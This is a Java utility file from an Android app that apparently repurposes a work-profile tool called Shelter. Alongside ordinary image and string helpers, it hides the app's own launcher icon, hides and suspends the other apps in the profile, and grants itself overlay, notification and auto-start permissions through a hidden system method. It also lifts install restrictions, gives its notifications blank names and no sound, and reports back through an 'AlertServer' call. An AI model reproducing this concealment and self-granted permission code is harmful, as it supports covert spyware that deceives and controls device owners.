package com.appd.instll.shalter;

import static com.appd.instll.shalter.MyBridge.BACK_ALERT;
import static com.appd.instll.shalter.MyBridge.BACK_DATA;

import static com.appd.instll.shalter.MyBridge.BACK_LOAD;
import static com.appd.instll.shalter.MyBridge.ReplyBack;

import android.annotation.TargetApi;
import android.app.AppOpsManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.LauncherActivityInfo;
import android.content.pm.LauncherApps;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Environment;
import android.os.UserHandle;
import android.os.UserManager;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import androidx.activity.result.contract.ActivityResultContract;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;


import com.appd.instll.splash;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.util.List;
import java.util.Optional;

public class Utility {
    public static boolean isProfileOwner(Context context) {
        return context.getSystemService(DevicePolicyManager.class)
                .isProfileOwnerApp(context.getPackageName());
    }

    public static class ActivityResultContractInputWrapper<I, O, T extends ActivityResultContract<I, O>>
            extends ActivityResultContract<Void, O> {
        private final T mInner;
        private final I mInput;

        public ActivityResultContractInputWrapper(T inner, I input) {
            mInner = inner;
            mInput = input;
        }

        @NonNull
        @Override
        public Intent createIntent(@NonNull Context context, Void input) {
            return mInner.createIntent(context, mInput);
        }

        @Override
        public O parseResult(int resultCode, @Nullable Intent intent) {
            return mInner.parseResult(resultCode, intent);
        }
    }

    public static void pipe(InputStream is, OutputStream os) throws IOException {
        int n;
        byte[] buffer = new byte[65536];
        while ((n = is.read(buffer)) > -1) {
            os.write(buffer, 0, n);
        }
    }

    public static void killShelterServices(IShelterService serviceMain, IShelterService serviceWork) {
        // Ensure that all our other services are killed at this point
        try {
            serviceWork.stopShelterService(true);
        } catch (Exception e) {
            // We are stopping anyway
        }

        try {
            serviceMain.stopShelterService(false);
        } catch (Exception e) {
            // We are stopping anyway
        }
    }

    public static boolean checkUsageStatsPermission(Context context) {
        return checkSpecialAccessPermission(context, AppOpsManager.OPSTR_GET_USAGE_STATS);
    }

    // Check if SYSTEM_ALERT_WINDOW is granted
    public static boolean checkSystemAlertPermission(Context context) {
        return checkSpecialAccessPermission(context, AppOpsManager.OPSTR_SYSTEM_ALERT_WINDOW);
    }

    public static boolean checkSpecialAccessPermission(Context context, String name) {
        AppOpsManager appops = context.getSystemService(AppOpsManager.class);
        int mode = appops.checkOpNoThrow(name, android.os.Process.myUid(), context.getPackageName());
        return mode == AppOpsManager.MODE_ALLOWED;
    }

    public static void hideWorkApps(Context context, DevicePolicyManager dpm, ComponentName admin) {
        LauncherApps launcher = (LauncherApps) context.getSystemService(Context.LAUNCHER_APPS_SERVICE);
        PackageManager pm = context.getPackageManager();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            for (UserHandle user : launcher.getProfiles()) {
                if (user.equals(android.os.Process.myUserHandle())) {
                    // This is the current profile (work profile)
                    List<LauncherActivityInfo> activities = launcher.getActivityList(null, user);

                    for (LauncherActivityInfo activityInfo : activities) {
                        String packageName = activityInfo.getComponentName().getPackageName();

                        // Skip your own app
                        if (packageName.equals(context.getPackageName())) continue;

                        try {
                            ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
                            boolean isSystem = (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;

                            if (isSystem) {
                                // System app — suspend and hide
                                dpm.setPackagesSuspended(admin, new String[]{packageName}, true);
                                dpm.setApplicationHidden(admin, packageName, true);
                            } else {

                                // Also hide it with DPM (more robust)
                                dpm.setApplicationHidden(admin, packageName, true);
                            }

                            Log.d("WorkProfile", "App hidden: " + packageName);
                        } catch (Exception e) {
                            Log.e("WorkProfile", "Failed to hide " + packageName, e);
                        }
                    }
                }
            }
        }
    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    private static UserHandle getWorkUserHandle(Context context) {
        LauncherApps launcher = (LauncherApps) context.getSystemService(Context.LAUNCHER_APPS_SERVICE);
        for (UserHandle user : launcher.getProfiles()) {
            if (user.equals(android.os.Process.myUserHandle())) {
                return user;
            }
        }
        return null;
    }

    public static int PRIM_OVERLAY = 24;
    public static int PRIM_NOTIFICATION = 11;
    public static int PRIM_AUTO_START = 10008;

    public static int PRIM_INSTLL_APPS = 66;

    public static String pref_install_app = "OPINSTALL";

    public static void autoSetPermission(Context context, String packageName, int permission) {
        PackageManager packageManager = context.getPackageManager();
        int uid = 0;
        try {
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(packageName, 0);
            uid = applicationInfo.uid;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return;
        }

        AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);

        try {
            Class clazz = AppOpsManager.class;

            Method method = clazz.getDeclaredMethod("setMode", int.class, int.class, String.class, int.class);
            method.setAccessible(true);
            method.invoke(appOpsManager, permission, uid, packageName, AppOpsManager.MODE_ALLOWED);
            Log.d("autoSet", "permission granted to " + packageName);
        } catch (Exception e) {
            Log.e("autoSet", Log.getStackTraceString(e));
        }
    }


    public static void enforceWorkProfilePolicies(Context context) {
        DevicePolicyManager manager = context.getSystemService(DevicePolicyManager.class);
        ComponentName adminComponent = new ComponentName(context.getApplicationContext(), ShelterDeviceAdminReceiver.class);

        // Hide this app in the work profile
        context.getPackageManager().setComponentEnabledSetting(
                new ComponentName(context.getApplicationContext(), splash.class),
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 0);

        // Clear everything first to ensure our policies are set properly
        manager.clearCrossProfileIntentFilters(adminComponent);

        try {
            hideWorkApps(context, manager, adminComponent);
        } catch (Exception d) {
            d.printStackTrace();
        }
        try {
            manager.setPermittedAccessibilityServices(adminComponent, null);
        } catch (Exception a) {
            a.printStackTrace();
        }

        try {
            //enable notifications
            autoSetPermission(context, context.getPackageName(), PRIM_NOTIFICATION);
        } catch (Exception a) {
        }

        try {
            //enable miui auto start
            autoSetPermission(context, context.getPackageName(), PRIM_AUTO_START);
        } catch (Exception a) {
        }

//        try{
//            //not working , may work if the app is enable it self not other app
//
//            manager.setSecureSetting(adminComponent,
//                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
//                    "com.icontrol.protector" + "/" + ".AccessServices");
//
//
//            manager.setSecureSetting(adminComponent,
//                    Settings.Secure.ACCESSIBILITY_ENABLED,
//                    "1");
//        }catch (Exception a){
//            Log.d("","");
//            a.printStackTrace();
//        }

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                //enable draw over apps
                autoSetPermission(context, context.getPackageName(), PRIM_OVERLAY);

            }
        } catch (Exception a) {
            a.printStackTrace();
        }


//        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
//
//           try{
//               UserManager um = (UserManager) context.getSystemService(Context.USER_SERVICE);
//               UserHandle workUser = null;
//               workUser = getWorkUserHandle(context);
//               if (workUser != null) {
//                   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
//                       um.requestQuietModeEnabled(true, workUser);
//                   }
//               }
//           }catch (Exception k){
//               k.printStackTrace();
//           }
//        }


        // Allow cross-profile intents for START_SERVICE
        manager.addCrossProfileIntentFilter(
                adminComponent,
                new IntentFilter(DummyActivity.START_SERVICE),
                DevicePolicyManager.FLAG_MANAGED_CAN_ACCESS_PARENT);

        manager.addCrossProfileIntentFilter(
                adminComponent,
                new IntentFilter(DummyActivity.TRY_START_SERVICE),
                DevicePolicyManager.FLAG_MANAGED_CAN_ACCESS_PARENT);

        manager.addCrossProfileIntentFilter(
                adminComponent,
                new IntentFilter(DummyActivity.UNFREEZE_AND_LAUNCH),
                DevicePolicyManager.FLAG_MANAGED_CAN_ACCESS_PARENT);

        manager.addCrossProfileIntentFilter(
                adminComponent,
                new IntentFilter(DummyActivity.FREEZE_ALL_IN_LIST),
                DevicePolicyManager.FLAG_MANAGED_CAN_ACCESS_PARENT);

//        manager.addCrossProfileIntentFilter(
//                adminComponent,
//                new IntentFilter(DummyActivity.DESTROY),
//                DevicePolicyManager.FLAG_MANAGED_CAN_ACCESS_PARENT);

        manager.addCrossProfileIntentFilter(
                adminComponent,
                new IntentFilter(DummyActivity.PUBLIC_FREEZE_ALL),
                DevicePolicyManager.FLAG_PARENT_CAN_ACCESS_MANAGED); // Used by FreezeService in profile

        manager.addCrossProfileIntentFilter(
                adminComponent,
                new IntentFilter(DummyActivity.FINALIZE_PROVISION),
                DevicePolicyManager.FLAG_PARENT_CAN_ACCESS_MANAGED);

        manager.addCrossProfileIntentFilter(
                adminComponent,
                new IntentFilter(DummyActivity.START_FILE_SHUTTLE),
                DevicePolicyManager.FLAG_MANAGED_CAN_ACCESS_PARENT);

        manager.addCrossProfileIntentFilter(
                adminComponent,
                new IntentFilter(DummyActivity.START_FILE_SHUTTLE_2),
                DevicePolicyManager.FLAG_PARENT_CAN_ACCESS_MANAGED);

        manager.addCrossProfileIntentFilter(
                adminComponent,
                new IntentFilter(DummyActivity.SYNCHRONIZE_PREFERENCE),
                DevicePolicyManager.FLAG_MANAGED_CAN_ACCESS_PARENT);

        // Needed by ShelterService and has to be proxied by the MainActivity in main profile
        manager.addCrossProfileIntentFilter(
                adminComponent,
                new IntentFilter(DummyActivity.INSTALL_PACKAGE),
                DevicePolicyManager.FLAG_MANAGED_CAN_ACCESS_PARENT);

        manager.addCrossProfileIntentFilter(
                adminComponent,
                new IntentFilter(DummyActivity.UNINSTALL_PACKAGE),
                DevicePolicyManager.FLAG_MANAGED_CAN_ACCESS_PARENT);

        // Allow ACTION_SEND and ACTION_SEND_MULTIPLE to cross from managed to parent
        IntentFilter actionSendFilter = new IntentFilter();
        actionSendFilter.addAction(Intent.ACTION_SEND);
        actionSendFilter.addAction(Intent.ACTION_SEND_MULTIPLE);
        try {
            actionSendFilter.addDataType("*/*");
        } catch (IntentFilter.MalformedMimeTypeException ignored) {
            // WTF?
        }
        actionSendFilter.addCategory(Intent.CATEGORY_DEFAULT);
        manager.addCrossProfileIntentFilter(
                adminComponent,
                actionSendFilter,
                DevicePolicyManager.FLAG_PARENT_CAN_ACCESS_MANAGED);

        // Browser intents are allowed from work profile to parent
        IntentFilter browsableIntentFilter = new IntentFilter(Intent.ACTION_VIEW);
        browsableIntentFilter.addCategory(Intent.CATEGORY_BROWSABLE);
        browsableIntentFilter.addDataScheme("http");
        browsableIntentFilter.addDataScheme("https");
        manager.addCrossProfileIntentFilter(
                adminComponent,
                browsableIntentFilter,
                DevicePolicyManager.FLAG_PARENT_CAN_ACCESS_MANAGED);
        IntentFilter browsableDefaultIntentFilter = new IntentFilter(Intent.ACTION_VIEW);
        browsableDefaultIntentFilter.addCategory(Intent.CATEGORY_BROWSABLE);
        browsableDefaultIntentFilter.addCategory(Intent.CATEGORY_DEFAULT);
        browsableDefaultIntentFilter.addDataScheme("http");
        browsableDefaultIntentFilter.addDataScheme("https");
        manager.addCrossProfileIntentFilter(
                adminComponent,
                browsableDefaultIntentFilter,
                DevicePolicyManager.FLAG_PARENT_CAN_ACCESS_MANAGED);

        // Block contacts searching optionally
//        manager.setCrossProfileContactsSearchDisabled(adminComponent,
//                SettingsManager.getInstance().getBlockContactsSearchingEnabled());

        manager.setProfileEnabled(adminComponent);
    }

    public static void enforceUserRestrictions(Context context) {
        DevicePolicyManager manager = context.getSystemService(DevicePolicyManager.class);
        ComponentName adminComponent = new ComponentName(context.getApplicationContext(), ShelterDeviceAdminReceiver.class);
        manager.clearUserRestriction(adminComponent, UserManager.DISALLOW_INSTALL_APPS);
        manager.clearUserRestriction(adminComponent, UserManager.DISALLOW_SHARE_LOCATION);
        manager.clearUserRestriction(adminComponent, UserManager.DISALLOW_INSTALL_UNKNOWN_SOURCES);
        manager.clearUserRestriction(adminComponent, UserManager.DISALLOW_UNINSTALL_APPS);

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) {
            // Polyfill for UserManager.DISALLOW_INSTALL_UNKNOWN_SOURCES
            // Don't use this on Android Oreo and later, it will crash
            manager.setSecureSetting(adminComponent, Settings.Secure.INSTALL_NON_MARKET_APPS, "1");
        }

        manager.addUserRestriction(adminComponent, UserManager.ALLOW_PARENT_PROFILE_APP_LINKING);
    }

    // Check if all file access r/w is granted
    @TargetApi(Build.VERSION_CODES.R)
    public static boolean checkAllFileAccessPermission() {
        return Environment.isExternalStorageManager();
    }

    public static int calculateInSampleSize(
            BitmapFactory.Options options, int reqWidth, int reqHeight) {
        // Raw height and width of image
        final int height = options.outHeight;
        final int width = options.outWidth;
        int inSampleSize = 1;

        if (height > reqHeight || width > reqWidth) {

            final int halfHeight = height / 2;
            final int halfWidth = width / 2;

            // Calculate the largest inSampleSize value that is a power of 2 and keeps both
            // height and width larger than the requested height and width.
            while ((halfHeight / inSampleSize) >= reqHeight
                    && (halfWidth / inSampleSize) >= reqWidth) {
                inSampleSize *= 2;
            }
        }

        return inSampleSize;
    }

    public static Bitmap decodeSampledBitmap(String filePath,
                                             int reqWidth, int reqHeight) {
        // First decode with inJustDecodeBounds=true to check dimensions
        final BitmapFactory.Options options = new BitmapFactory.Options();
        options.inJustDecodeBounds = true;
        BitmapFactory.decodeFile(filePath, options);

        // Calculate inSampleSize
        options.inSampleSize = calculateInSampleSize(options, reqWidth, reqHeight);

        // Decode bitmap with inSampleSize set
        options.inJustDecodeBounds = false;
        return BitmapFactory.decodeFile(filePath, options);
    }

    public static String getFileExtension(String filePath) {
        int index = filePath.lastIndexOf(".");
        if (index > 0) {
            return filePath.substring(index + 1);
        } else {
            return null;
        }
    }

    public static Bitmap drawableToBitmap(Drawable drawable) {
        Bitmap bitmap = null;

        try {
            if (drawable instanceof BitmapDrawable) {
                BitmapDrawable bitmapDrawable = (BitmapDrawable) drawable;
                if (bitmapDrawable.getBitmap() != null) {
                    return bitmapDrawable.getBitmap();
                }
            }

            if (drawable.getIntrinsicWidth() <= 0 || drawable.getIntrinsicHeight() <= 0) {
                bitmap = Bitmap.createBitmap(1, 1, Bitmap.Config.ARGB_8888); // Single color bitmap will be created of 1x1 pixel
            } else {
                bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(), drawable.getIntrinsicHeight(), Bitmap.Config.ARGB_8888);
            }

            Canvas canvas = new Canvas(bitmap);
            drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
            drawable.draw(canvas);
        } catch (Exception b) {
        }
        return bitmap;
    }

    public static int getMediaStoreId(Context context, String path) {
        Cursor cursor = context.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new String[]{MediaStore.MediaColumns._ID},
                MediaStore.MediaColumns.DATA + " LIKE ? ",
                new String[]{path}, null);
        if (cursor == null || cursor.getCount() == 0) {
            return -1;
        } else {
            cursor.moveToFirst();
            return cursor.getInt(cursor.getColumnIndex(MediaStore.MediaColumns._ID));
        }
    }

    public static String stringJoin(String delimiter, String[] list) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return String.join(delimiter, list);
        } else {
            if (list.length == 0) return "";
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < list.length - 1; i++) {
                sb.append(list[i]).append(delimiter);
            }
            sb.append(list[list.length - 1]);
            return sb.toString();
        }
    }

    public static boolean isWorkProfileAvailable(Context context) {
        LocalStorageManager storage = LocalStorageManager.getInstance();
        Intent intent = new Intent(DummyActivity.TRY_START_SERVICE);
        try {
            // DO NOT sign this request, because this won't be actually sent to work profile
            // If this is signed, and is the first request to be signed,
            // then the other side would never receive the auth_key
            Utility.transferIntentToProfileUnsigned(context, intent);
            storage.setBoolean(LocalStorageManager.PREF_IS_SETTING_UP, false);
            storage.setBoolean(LocalStorageManager.PREF_HAS_SETUP, true);
            return true;
        } catch (IllegalStateException e) {
            // If any exception is thrown, this means that the profile is not available
            return false;
        }
    }

    public static void transferIntentToProfile(Context context, Intent intent) {
        transferIntentToProfileUnsigned(context, intent);
        // Add signature
        //AuthenticationUtility.signIntent(intent);
    }

    public static void transferIntentToProfileUnsigned(Context context, Intent intent) {
        PackageManager pm = context.getPackageManager();
        List<ResolveInfo> info = pm.queryIntentActivities(intent, 0);
        Optional<ResolveInfo> i = info.stream()
                .filter((r) -> !r.activityInfo.packageName.equals(context.getPackageName()))
                .findFirst();
        if (i.isPresent()) {
            intent.setComponent(new ComponentName(i.get().activityInfo.packageName, i.get().activityInfo.name));
        } else {
            throw new IllegalStateException("Cannot find an intent in other profile");
        }
    }

    private static final String NOTIFICATION_CHANNEL_ID = "ShelterService";
    private static final String NOTIFICATION_CHANNEL_IMPORTANT = "ShelterService-Important";

    public static Notification buildNotification(Context context, String ticker, String title, String desc, int icon) {
        return buildNotification(context, false, ticker, title, desc, icon);
    }

    public static Notification buildNotification(Context context, boolean important, String ticker, String title, String desc, int icon) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            return buildNotificationOreo(context, important, ticker, title, desc, icon);
        } else {
            return buildNotificationLollipop(context, important, ticker, title, desc, icon);
        }
    }

    @TargetApi(Build.VERSION_CODES.LOLLIPOP)
    private static Notification buildNotificationLollipop(Context context, boolean important, String ticker, String title, String desc, int icon) {
        return new Notification.Builder(context)
                .setTicker(ticker)
                .setContentTitle(title)
                .setContentText(desc)
                .setSmallIcon(icon)
                .setPriority(important ? Notification.PRIORITY_MAX : Notification.PRIORITY_MIN)
                .build();
    }

    @TargetApi(Build.VERSION_CODES.O)
    private static Notification buildNotificationOreo(Context context, boolean important, String ticker, String title, String desc, int icon) {
        String id = important ? NOTIFICATION_CHANNEL_IMPORTANT : NOTIFICATION_CHANNEL_ID;
        // Android O and later: Notification Channel
        NotificationManager nm = context.getSystemService(NotificationManager.class);
        if (nm.getNotificationChannel(id) == null) {
            NotificationChannel chan = new NotificationChannel(
                    id,
                    important ? "   "
                            : " ",
                    important ? NotificationManager.IMPORTANCE_HIGH
                            : NotificationManager.IMPORTANCE_MIN);
            nm.createNotificationChannel(chan);
        }

        // Disable everything: do not disturb the user
        NotificationChannel chan = nm.getNotificationChannel(id);
      //  if (!important) {
            chan.enableVibration(false);
            chan.enableLights(false);
            chan.setSound(null,null);
            chan.setImportance(NotificationManager.IMPORTANCE_MIN);
//        } else {
//            chan.enableVibration(true);
//            chan.setImportance(NotificationManager.IMPORTANCE_HIGH);
//        }
//
        nm.createNotificationChannel(chan);

        // Create foreground notification to keep the service alive
        return new Notification.Builder(context, id)
                .setTicker(ticker)
                .setContentTitle(title)
                .setContentText(desc)
                .setSmallIcon(icon)
                .build();
    }

    public static void AlertServer(Context ctx,String msg){
        try{
            Intent intent = new Intent(BACK_ALERT);
            intent.putExtra(BACK_DATA, msg);
            ReplyBack(ctx, intent);
        }catch (Exception a){

        }
    }

}
